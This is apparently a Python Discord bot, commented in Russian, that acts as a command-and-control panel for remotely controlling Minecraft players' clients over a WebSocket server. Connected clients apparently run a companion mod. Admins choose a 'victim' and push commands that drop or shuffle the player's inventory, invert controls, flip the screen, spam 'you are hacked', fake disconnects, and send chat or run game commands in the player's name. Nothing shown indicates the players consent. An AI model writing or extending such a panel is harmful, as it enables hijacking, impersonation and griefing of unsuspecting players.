import os
import asyncio
import json
import discord
from discord.ext import commands
import websockets
from websockets.asyncio.server import serve

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TROLL_CHANNEL_ID = 1515619222842114158
WS_PORT = 8765
CONFIG_FILE = "config.json"

# ── Конфиг ───────────────────────────────────────────────────────────────────

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {"owner_id": None, "admin_ids": [], "protected_nicks": []}

def save_config():
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "owner_id": config["owner_id"],
            "admin_ids": list(config["admin_ids"]),
            "protected_nicks": list(config["protected_nicks"])
        }, f, indent=2)

config = load_config()
config["admin_ids"] = set(config["admin_ids"])
config["protected_nicks"] = set(config["protected_nicks"])

def is_owner(user_id: int) -> bool:
    return config["owner_id"] == user_id

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in config["admin_ids"]

def is_protected(nick: str) -> bool:
    return nick.lower() in {n.lower() for n in config["protected_nicks"]}

# ── Discord бот ───────────────────────────────────────────────────────────────

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

connected_players: dict[str, dict] = {}
troll_message: discord.Message = None


def make_embed(players: dict) -> discord.Embed:
    embed = discord.Embed(title="🎰 Casino Troll Panel", color=0xFF4444)
    if players:
        lines = []
        for nick, info in players.items():
            server = info.get("server", "???")
            shield = " 🛡️" if is_protected(nick) else ""
            lines.append(f"• `{nick}`{shield} — {server}")
        embed.add_field(name="🟢 Онлайн", value="\n".join(lines), inline=False)
    else:
        embed.add_field(name="🔴 Онлайн", value="Никого нет", inline=False)
    embed.set_footer(text="Выбери игрока и нажми кнопку | 🛡️ = защищён")
    return embed


# ── Модальные окна ────────────────────────────────────────────────────────────

class DropModal(discord.ui.Modal, title="Выбросить предметы"):
    slot = discord.ui.TextInput(label="Слот (0-35 или 'all')", default="all", max_length=10)
    amount = discord.ui.TextInput(label="Количество (1-64 или 'all')", default="all", max_length=5)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        slot_val = self.slot.value.strip().lower()
        amount_val = self.amount.value.strip().lower()
        if slot_val != "all":
            try:
                s = int(slot_val)
                if not 0 <= s <= 35:
                    await interaction.response.send_message("❌ Слот 0-35!", ephemeral=True); return
            except ValueError:
                await interaction.response.send_message("❌ Неверный слот!", ephemeral=True); return
        if amount_val != "all":
            try:
                a = int(amount_val)
                if not 1 <= a <= 64:
                    await interaction.response.send_message("❌ Количество 1-64!", ephemeral=True); return
            except ValueError:
                await interaction.response.send_message("❌ Неверное количество!", ephemeral=True); return
        await connected_players[player]["ws"].send(f"drop:{slot_val}:{amount_val}")
        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", ephemeral=True)


class SpamModal(discord.ui.Modal, title="Спам на экране"):
    message = discord.ui.TextInput(label="Сообщение", default="ТЫ ВЗЛОМАН 😈", max_length=50)
    count = discord.ui.TextInput(label="Повторений (1-30)", default="10", max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        try:
            c = int(self.count.value.strip())
            if not 1 <= c <= 30:
                await interaction.response.send_message("❌ Повторений 1-30!", ephemeral=True); return
        except ValueError:
            await interaction.response.send_message("❌ Неверное число!", ephemeral=True); return
        await connected_players[player]["ws"].send(f"spam:{self.message.value}:{c}")
        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True)


class ChatModal(discord.ui.Modal, title="Написать в чат"):
    message = discord.ui.TextInput(label="Сообщение (от имени игрока)", max_length=256)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        await connected_players[player]["ws"].send(f"chat:{self.message.value}")
        await interaction.response.send_message(f"✅ Чат → `{player}`: `{self.message.value}`", ephemeral=True)


class CommandModal(discord.ui.Modal, title="Выполнить команду"):
    command = discord.ui.TextInput(label="Команда (без /)", placeholder="tp ~ ~10 ~", max_length=256)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        await connected_players[player]["ws"].send(f"cmd:{self.command.value}")
        await interaction.response.send_message(f"✅ Команда → `{player}`: `/{self.command.value}`", ephemeral=True)


# ── Select игрока ─────────────────────────────────────────────────────────────

class PlayerSelect(discord.ui.Select):
    def __init__(self):
        players = list(connected_players.keys())
        options = [discord.SelectOption(label=p, value=p) for p in players] if players else [
            discord.SelectOption(label="Никого нет", value="none")
        ]
        super().__init__(placeholder="Выбери жертву...", options=options)

    async def callback(self, interaction: discord.Interaction):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа к панели!", ephemeral=True); return
        bot.selected_player = self.values[0]
        nick = self.values[0]
        if is_protected(nick):
            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", ephemeral=True)
        else:
            await interaction.response.send_message(f"✅ Выбран: `{nick}`", ephemeral=True)


# ── Меню эффектов (открывается по кнопке "😈 Троллинг") ──────────────────────

class TrollEffectsView(discord.ui.View):
    """Отдельное меню с визуальными эффектами."""

    def __init__(self):
        super().__init__(timeout=60)

    async def send_effect(self, interaction: discord.Interaction, cmd: str, label: str):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока в главной панели!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        try:
            await connected_players[player]["ws"].send(cmd)
            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)

    @discord.ui.button(label="🙃 Перевернуть экран", style=discord.ButtonStyle.danger, row=0)
    async def flip(self, interaction, button):
        await self.send_effect(interaction, "flip_screen", "Экран перевёрнут на 10с")

    @discord.ui.button(label="🖱️ Инвертировать мышку", style=discord.ButtonStyle.danger, row=0)
    async def invert_mouse(self, interaction, button):
        await self.send_effect(interaction, "invert_mouse", "Мышка инвертирована на 20с")

    @discord.ui.button(label="🔊 Воспроизвести звук", style=discord.ButtonStyle.primary, row=0)
    async def play_sound(self, interaction, button):
        await self.send_effect(interaction, "play_sound", "Звук воспроизведён")

    @discord.ui.button(label="❄️ Заблокировать движение", style=discord.ButtonStyle.primary, row=1)
    async def freeze(self, interaction, button):
        await self.send_effect(interaction, "freeze", "Игрок заморожен на 5с")

    @discord.ui.button(label="📳 Тряска экрана", style=discord.ButtonStyle.danger, row=1)
    async def shake(self, interaction, button):
        await self.send_effect(interaction, "shake", "Тряска экрана на 5с")

    @discord.ui.button(label="◀️ Назад к панели", style=discord.ButtonStyle.secondary, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        await interaction.response.send_message(
            "↩️ Используй главную панель выше.",
            ephemeral=True
        )


# ── Главная панель ────────────────────────────────────────────────────────────

class TrollView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PlayerSelect())

    async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True); return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", ephemeral=True); return
        try:
            await connected_players[player]["ws"].send(cmd)
            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)

    # row=1
    @discord.ui.button(label="🔀 Перемешать инвентарь", style=discord.ButtonStyle.danger, row=1)
    async def shuffle(self, interaction, button):
        await self.send_cmd(interaction, "shuffle", "Инвентарь перемешан")

    @discord.ui.button(label="🎮 Инвертировать WASD", style=discord.ButtonStyle.danger, row=1)
    async def invert(self, interaction, button):
        await self.send_cmd(interaction, "invert", "WASD инвертирован на 30с")

    @discord.ui.button(label="♻️ Вернуть управление", style=discord.ButtonStyle.secondary, row=1)
    async def restore(self, interaction, button):
        await self.send_cmd(interaction, "restore", "Управление восстановлено")

    # row=2
    @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
    async def drop(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        await interaction.response.send_modal(DropModal())

    @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
    async def spam(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        await interaction.response.send_modal(SpamModal())

    @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
    async def fakedisco(self, interaction, button):
        await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")

    # row=3
    @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
    async def banana(self, interaction, button):
        await self.send_cmd(interaction, "banana", "Бананчик запущен")

    @discord.ui.button(label="🧯 Огнетушитель", style=discord.ButtonStyle.primary, row=3)
    async def extinguisher(self, interaction, button):
        await self.send_cmd(interaction, "extinguisher", "Огнетушитель!")

    @discord.ui.button(label="💬 Написать в чат...", style=discord.ButtonStyle.secondary, row=3)
    async def chat(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        await interaction.response.send_modal(ChatModal())

    @discord.ui.button(label="⌨️ Выполнить команду...", style=discord.ButtonStyle.danger, row=3)
    async def command(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        await interaction.response.send_modal(CommandModal())

    # row=4
    @discord.ui.button(label="😈 Троллинг", style=discord.ButtonStyle.danger, row=4)
    async def troll_effects(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
        embed = discord.Embed(
            title=f"😈 Эффекты троллинга → {player}",
            description="Выбери эффект:",
            color=0x9B59B6
        )
        await interaction.response.send_message(embed=embed, view=TrollEffectsView(), ephemeral=True)

    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
    async def refresh(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
        await interaction.response.edit_message(
            embed=make_embed(connected_players),
            view=TrollView()
        )


# ── WebSocket сервер ──────────────────────────────────────────────────────────

async def update_panel():
    global troll_message
    if troll_message:
        try:
            await troll_message.edit(embed=make_embed(connected_players), view=TrollView())
        except:
            pass


async def notify_player(nick: str, protected: bool):
    if nick in connected_players:
        try:
            ws = connected_players[nick]["ws"]
            await ws.send(json.dumps({"type": "admin_status", "protected": protected}))
        except:
            pass


async def ws_handler(ws):
    nick = None
    try:
        async for raw in ws:
            data = json.loads(raw)
            msg_type = data.get("type")

            if msg_type == "hello":
                nick = data["nick"]
                server = data.get("server", "...")
                connected_players[nick] = {"ws": ws, "server": server}
                print(f"[WS] Подключился: {nick} @ {server}")
                await ws.send(json.dumps({"type": "admin_status", "protected": is_protected(nick)}))
                await update_panel()

            elif msg_type == "server" and nick in connected_players:
                connected_players[nick]["server"] = data["server"]
                await update_panel()

    except Exception as e:
        print(f"[WS] Ошибка: {e}")
    finally:
        if nick and nick in connected_players:
            del connected_players[nick]
            print(f"[WS] Отключился: {nick}")
            await update_panel()


async def start_ws_server():
    async with serve(ws_handler, "0.0.0.0", WS_PORT) as server:
        print(f"[WS] Сервер запущен на порту {WS_PORT}")
        await server.serve_forever()


# ── Команды ──────────────────────────────────────────────────────────────────

@bot.command(name="setowner")
async def set_owner(ctx, discord_id: int):
    if config["owner_id"] is not None:
        if not is_owner(ctx.author.id):
            await ctx.message.delete()
            await ctx.send("❌ Владелец уже задан.", delete_after=5); return
    config["owner_id"] = discord_id
    save_config()
    await ctx.message.delete()
    await ctx.send(f"👑 Владелец установлен: `{discord_id}`", delete_after=5)


@bot.command(name="addidadmin")
async def add_id_admin(ctx, discord_id: int):
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец может добавлять админов.", delete_after=5); return
    config["admin_ids"].add(discord_id)
    save_config()
    await ctx.send(f"✅ Администратор `{discord_id}` добавлен.", delete_after=5)


@bot.command(name="removeadmin")
async def remove_admin(ctx, discord_id: int):
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец может убирать админов.", delete_after=5); return
    config["admin_ids"].discard(discord_id)
    save_config()
    await ctx.send(f"✅ Администратор `{discord_id}` удалён.", delete_after=5)


@bot.command(name="addNotroll")
async def add_notroll(ctx, mc_nick: str):
    await ctx.message.delete()
    if not is_admin(ctx.author.id):
        await ctx.send("❌ Нет доступа.", delete_after=5); return
    config["protected_nicks"].add(mc_nick)
    save_config()
    await notify_player(mc_nick, True)
    await update_panel()
    await ctx.send(f"🛡️ Ник `{mc_nick}` теперь защищён.", delete_after=5)


@bot.command(name="removeNotroll")
async def remove_notroll(ctx, mc_nick: str):
    await ctx.message.delete()
    if not is_admin(ctx.author.id):
        await ctx.send("❌ Нет доступа.", delete_after=5); return
    config["protected_nicks"].discard(mc_nick)
    save_config()
    await notify_player(mc_nick, False)
    await update_panel()
    await ctx.send(f"✅ Ник `{mc_nick}` больше не защищён.", delete_after=5)


@bot.command(name="adminlist")
async def admin_list(ctx):
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец.", delete_after=5); return
    lines = [f"👑 Владелец: `{config['owner_id']}`"]
    if config["admin_ids"]:
        lines.append("👮 Админы: " + ", ".join(f"`{i}`" for i in config["admin_ids"]))
    if config["protected_nicks"]:
        lines.append("🛡️ Защищённые: " + ", ".join(f"`{n}`" for n in config["protected_nicks"]))
    await ctx.send("\n".join(lines), delete_after=15)


@bot.event
async def on_ready():
    global troll_message
    print(f"[Bot] Запущен как {bot.user}")
    channel = bot.get_channel(TROLL_CHANNEL_ID)
    if channel:
        troll_message = await channel.send(embed=make_embed({}), view=TrollView())
    asyncio.create_task(start_ws_server())


bot.selected_player = None
bot.run(BOT_TOKEN)
